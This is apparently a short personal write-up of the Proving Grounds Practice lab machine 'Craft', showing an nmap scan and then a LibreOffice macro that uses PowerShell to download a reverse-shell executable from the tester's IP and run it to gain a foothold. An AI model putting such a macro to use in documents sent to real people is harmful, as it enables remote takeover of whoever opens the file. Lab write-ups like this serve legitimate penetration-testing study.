layout: post
title:  "Write Up: Proving Grounds Practice - Craft"
date:   2024-07-23 12:08:25 -0400
categories: oscp proving-grounds TJNull windows
---



192.168.241.169
me - 192.168.45.231

As always we kick it off with an nmap scan

┌──(kali㉿kali)-[~/offsec/pg-practice/Craft]
└─$ sudo nmap -sC -sV -p- -Pn -oA craft 192.168.241.169 
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-20 16:54 EDT
Nmap scan report for 192.168.241.169
Host is up (0.036s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_http-title: Craft

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 116.41 seconds

setting up libreword macro to upload on the site

Sub Main
    Shell("cmd /c powershell iwr 'http://192.168.45.231/win/rshell.exe' -o 'C:/windows/tasks/rshell.exe'")
    Shell("cmd /c 'C:/windows/tasks/rshell.exe'")
End Sub


Got foothold
